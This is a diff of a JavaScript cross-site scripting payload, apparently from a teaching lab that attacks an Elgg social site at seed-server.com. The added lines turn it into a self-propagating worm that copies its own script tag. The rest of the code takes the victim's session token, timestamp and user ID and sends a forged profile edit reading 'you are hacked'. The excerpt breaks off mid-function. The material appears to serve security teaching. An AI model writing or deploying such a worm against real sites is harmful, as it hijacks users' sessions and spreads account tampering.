@@ -1,4 +1,10 @@
-<script type="text/javascript">
+<script id="worm">
+var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
+var jsCode = document.getElementById("worm").innerHTML; 
+var tailTag = "</" + "script>"; 
+var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 
+alert(jsCode);
+
 window.onload = function(){
 //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
 //and Security Token __elgg_token
@@ -10,7 +16,7 @@ var token="&__elgg_token="+elgg.security.token.__elgg_token;
 var content=userName + guid+ts+token+"&description=you are hacked"; //FILL IN
 var samyGuid=59; //FILL IN
 var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
-if(elgg.session.user.guid!=samyGuid) ➀
+if(elgg.session.user.guid!=samyGuid) 
 {
 //Create and send Ajax request to modify profile
 var Ajax=null;
